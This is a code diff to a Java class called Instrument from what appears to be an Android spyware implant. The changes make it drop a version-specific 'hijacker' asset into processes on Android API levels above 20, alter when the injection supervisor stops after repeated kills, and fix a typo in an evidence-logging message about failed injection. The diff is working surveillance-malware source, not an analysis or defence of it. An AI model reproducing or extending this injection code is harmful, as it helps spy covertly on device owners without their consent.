@@ -134,7 +134,11 @@ public class Instrument implements Runnable{
 			}
 
 			Utils.dumpAsset(libInAsset, lib_dest);
-			Utils.dumpAsset(M.e("mb.data"), hijacker);
+			if (android.os.Build.VERSION.SDK_INT > 20) {
+				Utils.dumpAsset(M.e("mbL.data"), hijacker);
+			}else{
+				Utils.dumpAsset(M.e("mb.data"), hijacker);
+			}
 			if(dexFile!= null){
 				File src = new File(path + "/" + dex_dest);
 				Utils.dumpAsset(dexFile, dex_dest);
@@ -248,7 +252,7 @@ public class Instrument implements Runnable{
 							Check.log(TAG + " (startInstrumentation) "+proc+" output: ");
 							for( String s : ret.stdout )
 							{
-								Check.log(TAG + s);
+								Check.log(TAG + " "+s);
 							}
 							Check.log(TAG + " (startInstrumentation) "+proc+" exit code: " + ret.exitCode);
 						}
@@ -524,7 +528,7 @@ public class Instrument implements Runnable{
 					checkProcessMonitor(false);
 				}
 			}
-			if(!trialsBelowLimits() && isStarted()){
+			if(!trialsBelowLimits()){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(run): too many kill stopping..");
 					instSupervisorContinue = false ;
@@ -597,7 +601,7 @@ public class Instrument implements Runnable{
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(startInjection): hijacker cannot be installed too many trials");
 			}
-			EvidenceBuilder.info(M.e("ingection " + proc +" cannot be installed,too many trials"));
+			EvidenceBuilder.info(M.e("injection " + proc +" cannot be installed,too many trials"));
 		}
 		return false;
 	}
